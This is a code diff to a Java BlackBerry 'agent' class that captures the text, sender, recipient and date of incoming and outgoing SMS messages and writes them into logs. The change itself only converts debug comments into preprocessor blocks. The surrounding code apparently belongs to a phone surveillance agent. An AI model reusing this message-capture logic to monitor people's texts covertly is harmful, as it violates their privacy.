@@ -1,3 +1,4 @@
+//#preprocess
 package blackberry.agent.sms;
 
 import java.io.ByteArrayOutputStream;
@@ -26,8 +27,9 @@ import blackberry.utils.WChar;
 public class SmsListener {
     private static final int SMS_VERSION = 2010050501;
 
-    // #debug
+    //#ifdef DEBUG
     static Debug debug = new Debug("SmsListener", DebugLevel.VERBOSE);
+    //#endif
 
     MessageConnection smsconn;
     SMSINListener insms;
@@ -75,14 +77,16 @@ public class SmsListener {
             boolean incoming) {
         String msg = null;
 
-        //#debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("saveLog: " + message);
+        //#endif
 
         if (message instanceof TextMessage) {
             TextMessage tm = (TextMessage) message;
             msg = tm.getPayloadText();
-            //#debug info
+            //#ifdef DEBUG_INFO
             debug.info("Got Text SMS: " + msg);
+            //#endif
 
         } else if (message instanceof BinaryMessage) {
             byte[] data = ((BinaryMessage) message).getPayloadData();
@@ -90,12 +94,14 @@ public class SmsListener {
             try {
                 msg = new String(data, "UTF-8");
             } catch (UnsupportedEncodingException e) {
-                //#debug error
+                //#ifdef DEBUG_ERROR
                 debug.error("saveLog:" + e);
+                //#endif
                 return;
             }
-            //#debug info
+            //#ifdef DEBUG_INFO
             debug.info("Got Binary SMS: " + msg);
+            //#endif
         }
 
         ByteArrayOutputStream os = null;
@@ -130,18 +136,19 @@ public class SmsListener {
             databuffer.write(Utils.padByteArray(from, 16));
             databuffer.write(Utils.padByteArray(to, 16));
 
-            //#debug info
+            //#ifdef DEBUG_INFO
             debug.info("Received sms : " + (incoming?"incoming":"outgoing"));
-            //#debug info
-            debug.info("From: " +from + " To: "+ to +" date: "+filetime);
+            debug.info("From: " +from + " To: "+ to +" date: "+filetime);            
+            //#endif
                         
             //Check.ensures(additionalData.length == 56, "Wrong buffer size");
 
             messageAgent.createLog(additionalData, WChar.getBytes(msg), LogType.SMS_NEW);
 
         } catch (final Exception ex) {
-            //#debug error
+            //#ifdef DEBUG_ERROR
             debug.error("saveLog message: " + ex);
+            //#endif
 
         } finally {
             if (os != null) {
